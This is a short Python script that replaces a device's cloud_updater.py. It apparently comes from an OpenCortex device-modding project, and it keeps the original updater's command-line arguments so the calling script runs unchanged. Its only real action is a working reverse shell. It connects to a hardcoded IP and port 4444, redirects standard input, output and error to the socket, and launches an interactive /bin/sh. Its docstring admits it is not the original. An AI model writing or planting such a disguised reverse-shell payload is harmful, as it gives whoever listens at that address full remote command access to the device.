#!/usr/bin/env python

from __future__ import print_function

import argparse
import sys
from os import dup2
from subprocess import call
import socket

__doc__ = """ This script is not the original cloud_updater.py and is part of the OpenCortex project, proceed with caution!
            """
            
# Enter your ip and desired port of the pc you are listening from
YOUR_IP = "192.168.1.178"
YOUR_PORT = 4444

# Keep the original arguments to avoid having to edit the updater bash script.
# This might work without them but I assume not.
# Only the --dir and --updatermode args will be used for this
parser = argparse.ArgumentParser("API http requests with request signing.", epilog=__doc__)
parser.add_argument("--host", help="", required=True)
parser.add_argument("--stage", help="", required=True)
parser.add_argument("--endpoint", help="", required=True)
parser.add_argument("--firmwareType", help="", required=True)
parser.add_argument("--firmwareVersion", help="", required=True)
parser.add_argument("--dir", help="Directory where to download files", required=True)
parser.add_argument("--fileName", help="")
parser.add_argument("--serialnumber", help="")
parser.add_argument("--updatermode", help="Updater Mode [check | download]")
args = parser.parse_args()

def reverse_shell(ip, port):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip, port)) 
    dup2(s.fileno(),0) 
    dup2(s.fileno(),1) 
    dup2(s.fileno(),2) 
    call(["/bin/sh","-i"])

if __name__ == "__main__":

    reverse_shell(YOUR_IP, YOUR_PORT)

    sys.exit(2)
